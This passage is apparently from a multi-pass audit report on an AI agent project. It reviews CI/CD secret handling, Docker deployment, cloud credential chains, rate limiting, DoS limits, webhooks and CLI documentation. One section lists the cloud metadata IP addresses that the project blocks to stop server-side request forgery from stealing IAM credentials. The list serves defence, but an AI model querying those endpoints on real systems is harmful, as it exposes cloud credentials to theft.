- No tests for kanban worker heartbeat/liveness edge cases.

---

### 2. CI/CD Pipeline Security

**Secrets masking:**
- All workflow secrets accessed via `${{ secrets.NAME }}` syntax — correct, GitHub auto-masks these in logs.
- `::add-mask::` not found in any workflow YAML — GitHub Actions masks secrets automatically when accessed via the `secrets.` context, so explicit masking is not required.
- `set-output` / `GITHUB_OUTPUT` used correctly via `$GITHUB_OUTPUT` environment variable (modern approach) in `nix/lib.nix` — not in direct workflow steps. No deprecated `set-output` command found in YAML steps.
- `tests.yml` passes empty strings for `OPENROUTER_API_KEY`, `OPENAI_API_KEY`, `NOUS_API_KEY` — prevents accidental real API calls but these are empty, not masked secrets, so no leakage risk.

**CI environment:**
- All workflows use pinned action SHAs (e.g. `actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd` v6.0.2) — good practice against action tampering.
- `permissions:` declared at job level with least-privilege (e.g. `contents: read` for tests).
- `upload_to_pypi.yml` uses `persist-credentials: false` on checkout — good.
- Docker publishing restricted to `github.repository == 'NousResearch/hermes-agent'` — forks cannot publish.

**No injection vulnerabilities found:**
- Workflow steps use single-quoted heredocs or `run: |` with shell `set -euo pipefail` — safe from variable injection.
- No user-provided input interpolated into shell commands without quoting.

---

### 3. Deployment Configuration

**Dockerfile:**
- Base: `debian:13.4` (slim, not alpine — avoids musl edge cases).
- PID 1: `tini` installed and used — properly reaps zombie MCP subprocesses, git, bun, etc. (see `#15012` fix). This is correct.
- User: `hermes` (UID 10000) — runs as non-root. Entry point drops to this user via `gosu`.
- `docker-cli` installed (line 17: `build-essential curl nodejs npm python3 ripgrep ffmpeg gcc python3-dev libffi-dev procps git openssh-client docker-cli tini`) — enables in-container Docker management.
- No default passwords hardcoded.
- `PYTHONUNBUFFERED=1` set — logs stream correctly.
- `PLAYWRIGHT_BROWSERS_PATH=/opt/hermes/.playwright` — browser binaries survive volume overlay.

**docker-compose.yml:**
- No CPU/memory resource limits on either `gateway` or `dashboard` services. Both use `restart: unless-stopped`.
- `network_mode: host` used for both services — intentionally bypasses Docker networking (simplifies bind-mount of `~/.hermes`). This is documented but means services are directly on the host network.
- Dashboard binds to `127.0.0.1` by default — correct, prevents remote exposure without an SSH tunnel or reverse proxy.
- No `API_SERVER_KEY` set by default (commented out) — API server is off unless explicitly enabled.
- No Docker socket volume mount in the compose file — the host's Docker socket is NOT exposed to containers by default.
- Note: The Dockerfile installs `docker-cli` but the compose file does NOT mount `/var/run/docker.sock`. The socket is only used if the agent invokes Docker from within a running container (not the published image scenario).

**No Kubernetes/Helm configs found:**
- No `deployment.yaml`, `kubeconfig`, or helm charts. The project does not target k8s deployments natively.

**Resource limits gap:**
- Neither `docker-compose.yml` nor any Dockerfile sets `--memory`, `--cpus`, `--ulimit`. For production, resource constraints should be documented or enforced.

---

### 4. Environment Variable Handling

**.gitignore:**
```
.env
.env.local
.env.development.local
.env.test.local
.env.production.local
.env.development
.env.test
export*
```
Correctly excludes all `.env` variants including `export*` patterns. ✓

**.dockerignore:**
Also excludes `.env` explicitly. ✓

**docker-compose.yml:**
- All secrets commented out as `${VAR}` substitutions (e.g. `${TEAMS_CLIENT_ID}`, `${API_SERVER_KEY}`) — no hardcoded values.
- `HERMES_UID`/`HERMES_GID` default to 10000 — not a secret, just an ID mapping.

**No hardcoded secrets found in docker configs:**
- No plaintext API keys, passwords, or tokens in `docker-compose.yml` or `Dockerfile`.

---

### 5. Startup/Shutdown Scripts

**Signal handling (cli.py lines 14141-14246):**
- SIGTERM/SIGHUP handlers installed via `_signal_handler()`.
- `HERMES_SIGTERM_GRACE` env var controls grace window (default 1.5s).
- Handler calls `agent.interrupt()` which sets `_interrupt_requested` flag — lets the agent loop exit cleanly between tool calls.
- After grace window: `SIGTERM` sent to subprocess, 1s wait, `SIGKILL` if still alive.
- On Windows: SIGINT is absorbed to prevent accidental interrupt on Ctrl+C.
- This is a well-designed graceful shutdown.

**Entry point (docker/entrypoint.sh):**
- Uses `gosu` to drop from root to `hermes` user before creating gateway files.
- Creates `/opt/data` directory.
- Falls back to `hermes` user if `HERMES_UID`/`HERMES_GID` not set.

**Health checks:**
- `gateway/platforms/api_server.py`: `GET /health` endpoint defined.
- `gateway/platforms/webhook.py`: `GET /health` endpoint defined.
- Signal platform: periodic health check every 30s (`HEALTH_CHECK_INTERVAL = 30.0`).
- ACP adapter: `_BENIGN_PROBE_METHODS = frozenset({"ping", "health", "healthcheck"})` for liveness probes.
- No explicit readiness/liveness probes in docker-compose.yml or Dockerfile HEALTHCHECK.

**Race conditions at startup:**
- `depends_on: gateway` on dashboard service — only waits for container to start, not for gateway to be ready. No health check dependency.
- The `network_mode: host` means services are immediately reachable but the gateway may not have finished initializing.

---

### 6. Rollout Strategy

**No documented blue-green, canary, or rolling restart strategy.**

**Current deployment approach (inferred from CI/CD):**
- On push to `main`: builds `nousresearch/hermes-agent:main` (amd64 + arm64 manifest list) via `docker-publish.yml`.
- On release tag (`v20*`): builds and publishes to Docker Hub with version tag.
- `restart: unless-stopped` in docker-compose — simple restart on failure.
- No orchestration for rolling updates, blue-green swaps, or canary traffic splitting.

**Gap:** For self-hosted deployments, there is no guidance on how to perform zero-downtime updates. Users running via docker-compose will get a brief outage on `docker compose pull && docker compose up -d`.

**CI/CD build pipeline quality:**
- Multi-arch builds (amd64 via `ubuntu-latest`, arm64 via `ubuntu-24.04-arm`).
- Smoke test via `.github/actions/hermes-smoke-test/action.yml` (runs `hermes --help` and `dashboard --help`).
- Build caching via GitHub Actions cache (`type=gha`).
- Digest-based pushing for multi-arch manifest lists.
- Duration-based test slicing across 6 parallel jobs.

---

### Summary of New Findings (Pass #51)

| ID | Category | Finding | Severity |
|----|----------|---------|----------|
| P51-1 | Test Coverage | No tests for `local.py` environment (677 LOC, the default fallback) | Medium |
| P51-2 | Test Coverage | No tests for `file_sync.py` (402 LOC) | Medium |
| P51-3 | Test Coverage | No tests for `singularity.py` environment | Medium |
| P51-4 | Test Coverage | No tests for many platform adapters (dingtalk, wecom, weixin, feishu, qqbot, bluebubbles, yuanbao, etc.) | Low |
| P51-5 | Deployment | No CPU/memory resource limits in docker-compose.yml | Low |
| P51-6 | Deployment | No healthcheck in docker-compose for gateway/dashboard dependency readiness | Low |
| P51-7 | Deployment | No documented zero-downtime rollout strategy for docker-compose updates | Low |
| P51-8 | CI/CD | `tests.yml` passes empty strings rather than mock objects for API keys (not a security issue but unusual) | Info |

**Already well-protected (from prior passes / confirmed):**
- Secrets properly masked via GitHub Actions `secrets.` context ✓
- Action SHAs pinned ✓
- Least-privilege permissions in workflows ✓
- `.env` excluded from `.gitignore` and `.dockerignore` ✓
- No hardcoded secrets in Docker configs ✓
- Non-root user in container (hermes:10000) ✓
- tini as PID 1 for zombie reaping ✓
- Graceful shutdown with SIGTERM/SIGHUP handlers ✓
- API server auth correctly enforced for non-loopback binding ✓
- Dashboard bound to 127.0.0.1 only ✓

**Still present (critical from prior passes):**
- P29-9: No shutdown()/unload() in PluginManager
- P36-5: sys.path mutation at import time
- P38-6: coerce_tool_args no length limit

---

## Pass #52 – Cloud Provider Integration, Serverless & GPU Deep Dive – 2026-05-24

### 1. AWS Bedrock

**Files:** `agent/bedrock_adapter.py`, `agent/anthropic_adapter.py`

**Credentials:** Uses boto3's default credential chain — no API key management required for AWS-native environments. The chain checks in priority order:
- `AWS_BEARER_TOKEN_BEDROCK` (Bedrock-specific bearer token)
- `AWS_ACCESS_KEY_ID` + `AWS_SECRET_ACCESS_KEY` (explicit IAM)
- `AWS_PROFILE` (named profile → SSO, assume-role)
- EC2 instance role / ECS task role / Lambda execution role via IMDS (implicit)

`resolve_aws_auth_env_var()` exposes the winning source without minting. `has_aws_credentials()` does a two-tier check — env vars first (fast, no I/O), then boto3's credential resolver for IMDS-based implicit sources. This prevents hangs when not on EC2 (IMDS unreachable).

**Region:** `resolve_bedrock_region()` checks `AWS_REGION` → `AWS_DEFAULT_REGION` → boto3/botocore config (`~/.aws/config` or SSO profile) → hard fallback to `us-east-1`. The boto3 fallback is critical for EU/AP users who configure region in `~/.aws/config` via named profile.

**Timeouts:** `build_anthropic_bedrock_client()` sets `timeout=Timeout(timeout=900.0, connect=10.0)` — 15 min total timeout, 10s connect. The Converse API path uses no explicit timeout on individual calls; boto3 manages connection pooling internally.

**Stale-connection resilience:** `_STALE_LIB_MODULE_PREFIXES = ("urllib3.", "botocore.", "boto3.")` + `is_stale_connection_error()` detects dead connections and `invalidate_runtime_client()` evicts the cached client so the next call reconnects with a fresh pool. This handles NAT timeouts, VPN flaps, and TCP RST.

**Tool-calling denylist:** `_NON_TOOL_CALLING_PATTERNS` includes `deepseek.r1`, `deepseek-r1`, `stability.` (image gen), `cohere.embed`, `amazon.titan-embed`. Unknown models default to tool-capable.

**Claude-on-Bedrock path:** `is_anthropic_bedrock_model()` detects `anthropic.claude-*` IDs with regional prefixes (`us.`, `global.`, `eu.`, `ap.`, `jp.`). For these, `build_anthropic_bedrock_client()` uses the Anthropic SDK's `AnthropicBedrock` class directly (full feature parity — prompt caching, thinking budgets, 1M context via `context-1m-2025-08-07` beta). Non-Claude Bedrock models use the Converse API path (`converse_stream` / `converse`).

**Lazy-loading architecture:** boto3 is a lazy dep — only loaded when Bedrock provider is selected. `ensure("provider.bedrock")` at module level handles on-demand installation so Bedrock works in EKS deployments without baking boto3 into the base image.

### 2. Azure Identity (Entra ID / Managed Identity)

**File:** `agent/azure_identity_adapter.py`

**Credential chain:** Uses `DefaultAzureCredential` from `azure-identity` SDK — the chain is: env service principal → workload identity → managed identity → VS Code → Azure CLI → azd → PowerShell → broker. All Azure-specific config (`AZURE_TENANT_ID`, `AZURE_CLIENT_ID`, `AZURE_CLIENT_SECRET`, `AZURE_FEDERATED_TOKEN_FILE`, `IDENTITY_ENDPOINT`/`MSI_ENDPOINT`) flows through standard SDK env vars; Hermes only manages `scope` and `exclude_interactive_browser` internally.

**Token refresh:** `build_token_provider()` returns a zero-arg callable that `azure-identity.get_bearer_token_provider()` wraps around the credential. Microsoft recommends this pattern — the SDK calls the callable before every request, so token refresh is transparent. For the Anthropic SDK (which doesn't accept callables for `auth_token`), `build_bearer_http_client()` installs an httpx request event hook that mint-fresh JWT per outbound request.

**EntraIdentityConfig:** A frozen dataclass (hashable, multiprocessing-safe) holds `scope` and `exclude_interactive_browser`. Serializing the config and rebuilding inside workers is the documented pattern for multiprocessing.

**Managed identity detection:** `describe_active_credential()` surfaces which env-var sources are present (`EnvironmentCredential`, `WorkloadIdentityCredential`, `ManagedIdentityCredential`) without minting a token.

**Credential probing:** `has_azure_identity_credentials()` runs `credential.get_token()` under a thread-based timeout (default 10s). Returns False on any error including thread timeout. `describe_active_credential()` returns detailed diagnostics for `hermes doctor`.

**MSI_ENDPOINT / IDENTITY_ENDPOINT:** These are checked for managed identity (App Service, Functions, Container Apps; VMs use IMDS instead).

### 3. Google Cloud

**Files:** `agent/google_oauth.py`, `agent/google_code_assist.py`

**GCP project ID resolution (priority order):** `HERMES_GEMINI_PROJECT_ID` → `GOOGLE_CLOUD_PROJECT` → `GOOGLE_CLOUD_PROJECT_ID`.

**Authentication:** `agent/google_oauth.py` handles OAuth flows with `refresh` field packing the refresh_token together with the resolved GCP project. The scope `https://www.googleapis.com/auth/cloud-platform` is used.

**Lazy import:** Heavy `google-cloud` imports are deferred — `google_oauth` only loads the actual SDK at first adapter use (RELEASE v0.14.0 fix "Defer heavy google-cloud imports in google_chat").

**Google Code Assist:** `agent/google_code_assist.py` validates tier requirements — paid tier access via GCP projects with billing / Workspace / Standard / Enterprise. Raises `GcpProjectIdRequired` if no project ID for paid tiers.

**Pub/Sub for Google Chat:** `tests/gateway/test_google_chat.py` mocks `google.cloud.pubsub_v1` and verifies credential handling from `GOOGLE_APPLICATION_CREDENTIALS`.

### 4. GPU Resource Management

**Files:** `skills/media/heartmula/SKILL.md`, `skills/mlops/evaluation/lm-evaluation-harness/SKILL.md`, `skills/mlops/evaluation/weights-and-biases/references/sweeps.md`, `skills/creative/comfyui/scripts/hardware_check.py`

**CUDA device selection:** Skills that use GPU set device via `--mula_device cuda:0 --codec_device cuda:1` (HeartMuLa) or `--device cuda:0` (lm-evaluation-harness). `torch.cuda.is_available()`, `torch.cuda.device_count()`, `torch.cuda.get_device_name(0)` are used for hardware detection. Multi-GPU uses `CUDA_VISIBLE_DEVICES` env var to pin to specific GPUs.

**Memory tracking:** `torch.cuda.memory_allocated()` and `torch.cuda.memory_reserved()` are logged (WandB sweep refs). HeartMuLa outputs "CUDA memory before unloading" lines to verify GPU usage.

**Multi-GPU strategies:** lm-evaluation-harness docs describe data parallelism (full model per GPU), tensor parallelism (model weights split across GPUs), and pipeline parallelism (layers split). 70B models require multi-GPU or quantization.

**No in-process GPU management in core agent:** The agent core does not directly manage GPU resources. GPU usage is confined to optional skills (HeartMuLa, lm-evaluation-harness, ComfyUI hardware check). There is no `torch.cuda.set_device()` or `CUDA_VISIBLE_DEVICES` management in the main agent loop.

### 5. Modal / Serverless Compatibility

**Files:** `tools/environments/modal.py`, `tools/environments/managed_modal.py`, `tools/environments/base.py`

**multiprocessing usage:** `batch_runner.py` uses `multiprocessing.Pool` for parallel batch processing. `_WORKER_CONFIG` global is set per worker. `batch_runner.py:869` notes "closures are not safely picklable across the multiprocessing.Pool" — a known constraint.

**Modal filesystem:** `ModalEnvironment` uses base64-encoded tar streaming via stdin for file uploads (bypasses 64KB `ARG_MAX_BYTES` exec-arg limit), with 1 MB chunk size. Downloads use `tar cf -` → stdout → write_bytes. Files synced via `FileSyncManager` before each execution and synced back on cleanup. Snapshotting uses `sandbox.snapshot_filesystem.aio()` for hibernation persistence.

**Serverless-incompatible patterns:**
- `EntraIdentityConfig` is multiprocessing-safe by design (frozen, hashable). `build_token_provider()` is explicitly NOT serializable — workers must rebuild inside their own process (documented).
- `batch_runner.py`'s `Pool` workers inherit global config but can't share callable token providers — rebuild-inside-worker pattern is used.

**Modal async worker pattern:** `ModalEnvironment` uses `_AsyncWorker` (background thread with its own event loop) to make async Modal SDK calls from synchronous execution contexts. Avoids blocking the main thread during sandbox exec.

**Managed Modal:** `ManagedModalEnvironment` uses a tool-gateway REST API rather than direct Modal SDK — has separate connect/poll/cancel read timeouts.

### 6. Cloud Environment Detection & Metadata API

**File:** `tools/url_safety.py`

**Always-blocked IPs:**
- `169.254.169.254` — AWS/GCP/Azure/DO/Oracle metadata
- `169.254.170.2` — AWS ECS task metadata (task IAM creds)
- `169.254.169.253` — Azure IMDS wire server
- `fd00:ec2::254` — AWS metadata (IPv6)
- `100.100.100.200` — Alibaba Cloud metadata
- IPv4-mapped IPv6 variants (`::ffff:x.x.x.x`)

**Always-blocked networks:** `169.254.0.0/16` (entire link-local range), `::ffff:169.254.0.0/112` (IPv4-mapped link-local).

**Hermes doctor:** `hermes_cli/doctor.py` notes "boto3's IMDS lookup for AWS credentials" as a 2s delay source. Avoids IMDS probe by setting `AWS_EC2_METADATA_DISABLED=true` when not on EC2. The bedrock probe already gates on real env-var creds so IMDS is not reached unnecessarily.

**No proactive cloud detection:** The agent does not have a utility that says "I am running on AWS/GCP/Azure." Cloud detection is implicit — credentials probed via provider-specific mechanisms without an explicit "which cloud am I on?" check.

### Key Findings Summary

| Area | Finding | Severity |
|------|---------|----------|
| AWS Bedrock | Stale-connection detection + client eviction is solid | OK |
| AWS Bedrock | 15-min timeout on AnthropicBedrock client may be too long for some workloads | Low |
| AWS Bedrock | No env var to override default `us-east-1` fallback without boto3 config file | Low |
| Azure Entra | `build_token_provider()` not serializable — multiprocessing workers must rebuild (documented) | Design |
| Azure Entra | Probe thread timeout (10s) prevents hanging on unreachable token service | OK |
| GCP | No `GOOGLE_APPLICATION_CREDENTIALS` path to file-based creds in core auth — relies on gcloud ADC | Low |
| GPU | Core agent has no GPU management; all GPU usage is in optional skills | OK |
| GPU | Multi-GPU via `CUDA_VISIBLE_DEVICES` is skill-level, not agent-level | OK |
| Modal | multiprocessing Pool + callable token providers need worker-side rebuild (documented limitation) | Design |
| Modal | File upload uses base64+tar+stdin pipeline to bypass Modal's 64KB exec-arg limit | OK |
| Cloud metadata | All major cloud metadata IPs are in blocked list with IPv4-mapped IPv6 variants | OK |
| Cloud metadata | No proactive cloud-platform detection utility; each provider self-reports | Design |

---

**End Pass #52**


---

## Pass #53 - API Design, Rate Limiting & DoS Mitigation - 2026-05-24T17:22:00Z

### 1. Rate Limiting

**API Server (api_server.py) - no per-key enforcement**
- No per-client-API-key rate limiting exists. _check_auth() validates the Bearer token but does not track request counts or burst per key.
- Enforced limit: _MAX_CONCURRENT_RUNS = 10 (line 2825) caps concurrent /v1/runs executions - hard concurrency limit, not a rate limit. Returns HTTP 429 with code="rate_limit_exceeded" when exceeded.
- No X-RateLimit-* response headers are emitted.
- No sliding-window or token-bucket per-key tracking.

**Webhook (webhook.py) - per-route fixed-window rate limiting**
- Lines 406-413: per-route fixed-window rate limiter, configurable via rate_limit extra (default 30/minute).
- Returns HTTP 429 {"error": "Rate limit exceeded"} when window is full.
- Rate limit state lives in _rate_counts: Dict[str, List[float]] - in-memory, per route. No distributed tracking across multiple gateway instances.

**Signal (signal_rate_limit.py)**
- Token-bucket simulator for Signal attachment sends. Carries retry_after from server on 429 and uses it to recalibrate refill rate.
- SIGNAL_RATE_LIMIT_MAX_ATTEMPTS = 2 for retries.

**Pairing (pairing.py)**
- MAX_PENDING_PER_PLATFORM = 3 - max pending pairing codes per platform.
- MAX_FAILED_ATTEMPTS = 5 - lockout after 5 failed approvals (line 50).

**Slack**
- 3-retry exponential backoff on 429 (1s, 2s) for conversations.replies (slack.py:2627).

**General DoS - agent cache cap**
- _AGENT_CACHE_MAX_SIZE = 128 (run.py:64) - max cached AIAgent instances.
- _AGENT_CACHE_IDLE_TTL_SECS = 3600.0 (run.py:65) - evict agents idle >1h.
- Enforced via LRU OrderedDict + TTL sweep from _session_expiry_watcher().

### 2. API Endpoint Design

**API Server - OpenAI-compatible REST surface**
- All endpoints follow REST conventions: POST /v1/chat/completions, GET /v1/models, etc.
- HTTP status codes used correctly:
  - 200 for successful responses
  - 400 for malformed requests / invalid JSON / validation errors
  - 401 for bad API key
  - 403 for forbidden (CORS origin rejection, session continuation without key)
  - 404 for unknown routes
  - 413 for oversized request bodies (MAX_REQUEST_BYTES = 10_000_000 / 10MB)
  - 429 for rate limit exceeded (concurrent runs cap)
  - 500 for internal errors
  - 502 for agent failures with partial/empty response
- Consistent error envelope via _openai_error(): {"error": {"message": ..., "type": ..., "param": ..., "code": ...}}
- CORS middleware validates origin before routing (line 496: returns 403 for disallowed origin).
- Security headers applied to all responses: CSP, X-Frame-Options, Strict-Transport-Security, etc. (line 540-548).

**Webhooks**
- Returns 404 for unknown routes, 413 for oversized bodies, 401 for invalid HMAC, 403 for missing secret, 429 for rate limit, 400 for unparseable body, 200 for ignored events, 202 for accepted async processing, 502 for delivery failure.

### 3. DoS Protection

**Request size limits**
- API server: MAX_REQUEST_BYTES = 10_000_000 (10MB) - enforced by body_limit_middleware before JSON parsing (lines 526-538).
- Webhook: _max_body_bytes = 1_048_576 (1MB) - checked before reading body (line 370).
- Content normalization: MAX_NORMALIZED_TEXT_LENGTH = 65_536 (64KB) per content part; MAX_CONTENT_LIST_SIZE = 1_000 items per list; recursion depth capped at 10 (lines 63-64, 104-159).

**Timeouts**
- CHAT_COMPLETIONS_SSE_KEEPALIVE_SECONDS = 30.0 - keepalive comment sent every 30s during SSE streaming (line 62, 1457).
- gh pr comment subprocess: timeout=30 seconds (webhook.py:858).
- subprocess.Popen in tui_gateway/server.py: no explicit timeout on worker process (line 202), but queue.Queue with _SLASH_WORKER_TIMEOUT_S = max(5.0, ...) (line 240) for slash command execution.
- No per-request overall timeout on API server agent runs - runs can be long.

**Resource limits**
- _MAX_CONCURRENT_RUNS = 10 caps concurrent runs at API server (line 2825).
- _AGENT_CACHE_MAX_SIZE = 128 caps cached agent instances (run.py:64).
- _RUN_STREAM_TTL = 300 - orphaned SSE streams swept after 5 minutes (line 2826).
- _RUN_STATUS_TTL = 3600 - terminal run status retained for 1 hour (line 2827).
- MAX_STORED_RESPONSES = 100 in ResponseStore (api_server.py:60).
- _MAX_SESSION_HEADER_LEN = 256 - session key header length cap to prevent memory burn (api_server.py:803).
- Idempotency cache: max_items=1000, ttl_seconds=300 (_IdempotencyCache, line 565).

### 4. Concurrent Connection Limits

**API Server**
- _MAX_CONCURRENT_RUNS = 10 - hard cap on concurrent /v1/runs submissions (line 2825). Enforced before run starts. Returns 429 rate_limit_exceeded.
- Active streams tracked in _run_streams: Dict[str, asyncio.Queue] (line 687).
- _RUN_STREAM_TTL = 300 - orphaned stream cleanup.

**TUI Gateway (tui_gateway/server.py)**
- _rpc_pool_workers = 4 (default, configurable via HERMES_TUI_RPC_POOL_WORKERS, line 164) - ThreadPoolExecutor for long-running RPC handlers.
- LONG_HANDLERS (line 146): browser.manage, cli.exec, session.branch, session.compress, session.resume, shell.exec, skills.manage, slash.exec - routed to thread pool to avoid blocking the dispatcher.
- No explicit inbound connection limit; the pool caps concurrent long handlers.
- _sessions: dict - no hard cap on number of active TUI sessions.

**No global connection limit** - no MAX_CONNECTIONS or similar across the gateway process.

### 5. API Versioning

**No explicit API versioning scheme**
- The API server uses /v1/ path prefix for all endpoints, following OpenAI convention.
- No /v2/, /v3/ or version negotiation headers.
- No formal deprecation policy documented in code. GET /v1/capabilities advertises the current stable surface for discovery, acting as a self-documenting version contract.
- /v1/capabilities (line 992-1049) is the version-stability mechanism: it lists which features are available so clients can probe capability rather than assume by version number.
- No formal API_SERVER_VERSION or breaking-change announcement mechanism in the codebase.

### 6. Webhook Delivery

**Retry backoff**
- No automatic retry on webhook delivery failures. The send() method (webhook.py:222) dispatches to delivery target and returns SendResult - no internal retry loop.
- External delivery (GitHub gh pr comment) has a 30s subprocess timeout but no retry on failure (line 858).
- Cross-platform delivery uses the target adapter's send() directly - no retry layer.

**Idempotency**
- Lines 495-512: _seen_deliveries TTL cache keyed by delivery_id (from X-GitHub-Delivery / svix-id / X-Request-ID header).
- TTL: _idempotency_ttl = 3600 seconds (1 hour).
- Returns HTTP 200 {"status": "duplicate", ...} on repeat delivery within TTL.
- Cache pruned on every POST to keep size bounded.

**Timeout**
- No explicit timeout on webhook agent processing. handle_message() runs as asyncio.create_task (line 616) and returns 202 immediately.
- _background_tasks: set tracks pending tasks with add_done_callback for cleanup (lines 617-618).

**Signature validation (auth-before-body)**
- Content-Length checked before body read (line 369).
- HMAC validated before any processing (line 386).
- INSECURE_NO_AUTH mode only allowed on loopback hosts - startup validation (line 165) prevents accidental public exposure.
- Svix signature validation with 300-second tolerance window (line 697).

---

## Pass #54 – Documentation, Help Text & CLI Usability Audit – 2026-05-24T21:30:00Z

Scope: CLI help text accuracy, error message quality, documentation accuracy, examples/templates, built-in help hierarchy.

---

### P54-1 · `hermes --help` delegates to subprocess with no timeout — MEDIUM

**File:** `cli.py:8626` (`subprocess.run(cmd)` with `cmd = [sys.executable, '-m', 'hermes', '--help']`)
**Severity:** MEDIUM

`hermes --help` (and the equivalent `/help` slash command) triggers a fresh Python interpreter subprocess to generate the help text, with no timeout. If the Hermes import path is broken or Python startup is slow, this hangs indefinitely.

**Note:** This was flagged in P45-1 in prior passes, but remains unfixed as of this scan.

**Recommendation:** Add a `timeout=30` to the subprocess call, or inline help generation instead of a subprocess spawn.

---

### P54-2 · No formal error code system — informational gap — LOW

**File:** Project-wide
**Severity:** LOW

Hermes error messages use varied phrasing: `"✗ {text}"` (cli_output.py), JSON-RPC `-32700` (tui_gateway/entry.py), free-text gateway messages. There is no centralized error code namespace (e.g., `HERMES_ERR_001` style). Users cannot programmatically distinguish error types without parsing message text.

The codebase self-reports "actionable error messages" in RELEASE notes but does not assign error codes or enumerations. The RELEASE_v0.8.0.md explicitly calls out "actionable error messages" as a feature but without a structured code system, grep-based detection is the only option.

**Recommendation:** Consider an enumerated `HermesErrorCode` enum (in `hermes_constants.py` or a new errors module) with a published table in CONTRIBUTING.md mapping codes to causes and resolutions.

---

### P54-3 · CLI help text derived from `COMMAND_REGISTRY` is accurate and consistent — PASS

**File:** `hermes_cli/commands.py`
**Severity:** N/A (positive finding)

The central `CommandDef` dataclass in `commands.py` is the single source of truth for all slash commands. It is used by:
- `show_help()` in cli.py (lines 5857–5906) — formats `COMMANDS_BY_CATEGORY`
- `process_command()` in cli.py — dispatch resolver
- Gateway `GATEWAY_KNOWN_COMMANDS` frozenset
- Telegram BotCommands, Slack subcommand mapping, autocomplete

All commands have `name`, `description`, `category`, `aliases`, `args_hint`, and optionally `subcommands`. The schema is consistent and machine-readable. No deprecated flags found in the registry.

**Positive finding:** Help hierarchy is well-structured — commands are categorized (Session, Configuration, Tools & Skills, Info, Exit), include argument hints, and the `cli_only` / `gateway_only` flags correctly gate availability.

---

### P54-4 · `hermes help <command>` uses argparse with `SystemExit` swallow — works correctly — PASS

**File:** `cli.py:7958–7964`
**Severity:** N/A (positive finding)

When `hermes help <subcommand>` is invoked, argparse is called and catches `SystemExit` (raised by argparse on `--help` or errors) so it doesn't kill the interactive CLI session. The pattern is:
```python
except SystemExit:
    pass  # argparse calls sys.exit() on --help; swallow so we don't kill the session
```

This is intentional and correct.

---

### P54-5 · README.md is current and accurate — PASS with minor issues

**File:** `README.md`

- Correctly lists `hermes setup --portal` for Nous Portal OAuth flow
- Quick-start commands (`hermes`, `hermes model`, `hermes tools`, `hermes config set`, `hermes gateway`, `hermes setup`, `hermes update`, `hermes doctor`) match actual CLI commands
- Windows early-beta disclaimer is present and accurate
- Termux guide reference is correct
- No broken external links detected in visible content

**Minor issue:** README section "Skip the API-key collection — Nous Portal" says "One command from a fresh install: `hermes setup --portal`" but the portal setup wizard may require interactive terminal input depending on OAuth provider — not fully non-interactive. This is not a doc error but a usability note.

---

### P54-6 · CONTRIBUTING.md is thorough — PASS

**File:** `CONTRIBUTING.md`

- Correctly documents that new memory providers are no longer accepted into `plugins/memory/` and should be standalone plugins
- Skill vs. Tool decision tree is clear and actionable
- Dev setup instructions (`uv venv`, `uv pip install -e ".[all,dev]"`, `npm install`) are accurate
- Git LFS requirement mentioned
- Contribution priorities are well-defined

---

### P54-7 · RELEASE notes are comprehensive and linked — PASS

**Files:** `RELEASE_v0.14.0.md` through `RELEASE_v0.2.0.md`

- All 13 RELEASE files present (v0.2.0 through v0.14.0)
- Each release has PR numbers, descriptions, and severity categorizations
- v0.14.0 header correctly identifies 808 commits, 633 merged PRs, 165,061 insertions
- v0.8.0 correctly references "actionable error messages" as a feature with PR #4959

No broken links detected in visible content. PR numbers are well-formed GitHub URLs.

---

### P54-8 · `.env.example` is well-documented — PASS

**File:** `.env.example`

- Clearly separates LLM provider sections with commented headers
- Notes `LLM_MODEL` is no longer read from .env (kept for reference only) — accurate
- API key setup instructions with provider URLs
- Multiple provider examples (OpenRouter, NovitaAI, Google AI Studio, Ollama Cloud, z.ai/GLM)

---

### P54-9 · `cli-config.yaml.example` is comprehensive — PASS with one note

**File:** `cli-config.yaml.example` (1100 lines)

- Well-structured with clear section headers
- `context_length` vs `max_tokens` distinction is explicitly documented with a warning about the OpenAI/Anthropic naming difference
- Azure Foundry keyless auth (Entra ID) example is present and accurate
- Provider aliases (`ollama`, `vllm`, `llamacpp` → `custom`) documented
- Named provider overrides section

**Note:** The example config is 1100 lines — large for a quick-start but accurate as a reference. No working minimal config is provided separately.

---

### P54-10 · No man pages shipped — LOW (usability gap)

**Files:** None found

Hermes ships no man pages (`.1` files) in the repo or as part of the pip package. The built-in `/help` and `hermes --help` are the only first-class help interfaces. This is acceptable for a CLI tool but means `man hermes` will not work.

**Recommendation:** If man page generation is desired, a target in `scripts/` using `sphinx-man` or similar could generate them from docstrings. Alternatively, a `hermes.1` man page in the repo would enable `man ./hermes.1` for users who prefer man pages.

---

### P54-11 · Error messages in `cli_output.py` lack error codes — LOW

**File:** `hermes_cli/cli_output.py:31–33`

```python
def print_error(text: str) -> None:
    """Print a red error message with ✗ prefix."""
    print(color(f"✗ {text}", Colors.RED))
```

Errors printed via `print_error` have no code, no suggested action, and no reference to logs or support channels. While these are CLI-facing human messages, adding a lightweight hint (e.g., "Run `hermes doctor` to diagnose" or a code prefix) would make them more actionable.

**Contrast:** The gateway error messages in `tui_gateway/entry.py` use JSON-RPC error codes (`-32700` for parse error), which IS structured. The CLI error path is less structured.

**Recommendation:** For a future pass: consider adding an optional `code=` parameter to `print_error`/`print_warning` so errors can optionally carry a searchable code.

---

### P54-12 · `print_config_warnings()` is called at CLI startup — positive pattern — PASS

**File:** `cli.py:677–681`

```python
try:
    from hermes_cli.config import print_config_warnings
    print_config_warnings()
```

Config structure validation runs early, printing warnings before the user hits cryptic errors later. This is a good UX pattern — config problems surface at startup with actionable messages rather than failing mid-session.

---

### P54-13 · `gateway/run.py` unknown command message is good — PASS

**File:** `gateway/run.py:7655–7658`

```python
f"Unknown command `/{command}`. "
f"Type /commands to see what's available, "
f"or resend without the leading slash to send "
f"as a regular message."
```

The unknown command error tells users what to do next: use `/commands` or resend without slash. This is a good actionable error message pattern.

---

*Pass #54 complete - 13 findings across 5 focus areas.*

---

## Pass #55 – Logging, Observability & Telemetry Deep Dive – 2026-01-26T00:00:00Z

### 1. Structured Logging Consistency

**Logger setup** — `hermes_logging.py` is the single centralized entry point. Key design decisions:

- `setup_logging()` is idempotent (safe to call twice; guard via `_logging_initialized` global)
- Three log files: `agent.log` (INFO+, catch-all), `errors.log` (WARNING+), `gateway.log` (INFO+, gateway components only via `_ComponentFilter`)
- All use `RotatingFileHandler` with `RedactingFormatter` — secrets never reach disk
- `setup_verbose_logging()` adds a DEBUG-level console handler for `-v` mode

